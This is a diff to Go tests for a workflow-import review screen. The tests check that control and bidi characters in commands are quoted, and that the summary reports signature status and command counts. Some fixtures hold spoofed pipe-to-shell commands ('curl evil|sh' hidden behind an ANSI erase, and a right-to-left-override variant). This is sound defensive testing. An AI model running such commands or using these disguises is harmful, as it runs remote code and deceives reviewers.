@@ -73,7 +73,7 @@ func TestRenderWorkflowQuotesControlCharacters(t *testing.T) {
 	var out bytes.Buffer
 	renderWorkflow(&out, pwf.Workflow{Title: "t", Root: "r", Programs: []pwf.Program{{
 		Step: "x:merge", Profile: "git", Run: "curl evil|sh\r\x1b[2K  x:merge [git]: gh pr merge",
-	}}})
+	}}}, 0)
 	assert.Contains(t, out.String(), `"curl evil|sh\r\x1b[2K  x:merge [git]: gh pr merge"`)
 	assert.NotContains(t, out.String(), "\x1b")
 }
@@ -89,6 +89,31 @@ func TestWorkflowImportChoices(t *testing.T) {
 
 // The review shows mapped and unknown roles and the ids templates are
 // stored under.
+// A review shown in a browser must not let a bidi override make a command read
+// as something else.
+func TestShownQuotesFormatCharacters(t *testing.T) {
+	assert.Equal(t, "plain command", shown("plain command"))
+	assert.Equal(t, `"curl a/\u202ehs|live"`, shown("curl a/\u202ehs|live"))
+	assert.Equal(t, `"a\u2066b"`, shown("a\u2066b"))
+}
+
+// The popup's summary carries what a cut must not hide, and the count of
+// templates is the review's, not the file's own list.
+func TestWorkflowImportReview(t *testing.T) {
+	review, err := WorkflowImportReview([]byte(`{
+		"title": "Ship", "root": "ship@sha256:aa", "group": "crew", "refused": "unsigned",
+		"programs": [{"run": "make"}, {"run": "deploy"}],
+		"templates": [{"ref": "ship@sha256:aa", "status": "new"}, {"ref": "x@sha256:bb", "status": "update"}, {"ref": "y@sha256:cc", "status": "new"}]
+	}`))
+	require.NoError(t, err)
+	assert.Contains(t, review.Summary, "Signature: none (unverified)")
+	assert.Contains(t, review.Summary, "Commands it can run: 2")
+	assert.Contains(t, review.Summary, "Templates: 2 new, 1 update")
+	assert.Contains(t, review.Summary, "Pins the process to group crew.")
+	assert.Equal(t, "unsigned", review.Refused)
+	assert.Contains(t, review.Full, "Root: ship@sha256:aa (3 template(s))")
+}
+
 func TestRenderImportChanges(t *testing.T) {
 	var view workflowImportJSON
 	require.NoError(t, json.Unmarshal([]byte(`{
@@ -124,12 +149,12 @@ func TestRenderPaths(t *testing.T) {
 // A review credits the author as a claim, not a fact.
 func TestRenderWorkflowShowsAuthorAndLicence(t *testing.T) {
 	var out bytes.Buffer
-	renderWorkflow(&out, pwf.Workflow{Title: "t", Root: "r", Author: "Acme", Licence: "MIT"})
+	renderWorkflow(&out, pwf.Workflow{Title: "t", Root: "r", Author: "Acme", Licence: "MIT"}, 0)
 	assert.Contains(t, out.String(), "Author: Acme (as the file says)\n")
 	assert.Contains(t, out.String(), "Licence: MIT\n")
 
 	out.Reset()
-	renderWorkflow(&out, pwf.Workflow{Title: "t", Root: "r"})
+	renderWorkflow(&out, pwf.Workflow{Title: "t", Root: "r"}, 0)
 	assert.NotContains(t, out.String(), "Author")
 	assert.NotContains(t, out.String(), "Licence")
 }
